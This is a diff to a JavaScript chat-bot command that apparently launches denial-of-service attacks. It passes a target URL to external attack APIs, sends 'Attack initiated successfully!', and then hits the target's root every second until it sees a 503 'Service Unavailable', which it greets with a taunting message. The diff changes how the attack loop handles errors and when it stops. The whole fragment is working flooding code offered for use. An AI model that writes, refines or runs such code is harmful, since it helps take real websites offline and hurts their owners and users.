@@ -33,7 +33,7 @@ module.exports.run = async ({ args, chat, font }) => {
 
     try {
       const response = await axios.get(`${apis[index]}?url=${encodeURIComponent(targetUrl)}`, {
-        timeout: 10000 // Timeout in milliseconds
+        timeout: 10000
       });
       await preparingMessage.delete();
       await chat.reply(font.thin(response.data.message || 'Attack initiated successfully!'));
@@ -42,10 +42,14 @@ module.exports.run = async ({ args, chat, font }) => {
 
       const attackInterval = setInterval(async () => {
         try {
-          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0], {
-          });
+          await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0]);
         } catch (error) {
-          if (error.response && !errorMessageSent) {
+          if (errorMessageSent) {
+            clearInterval(attackInterval);
+            return;
+          }
+
+          if (error.response) {
             if (error.response.status === 503) {
               await chat.reply(font.thin('Ako importante? putah! Service Unavailable (503).'));
               errorMessageSent = true;
@@ -55,10 +59,6 @@ module.exports.run = async ({ args, chat, font }) => {
               errorMessageSent = true;
               clearInterval(attackInterval);
             }
-          } else if (error.code === 'ECONNABORTED' && !errorMessageSent) {
-            await chat.reply(font.thin('Request to target timed out.'));
-            errorMessageSent = true;
-            clearInterval(attackInterval);
           }
         }
       }, 1000);
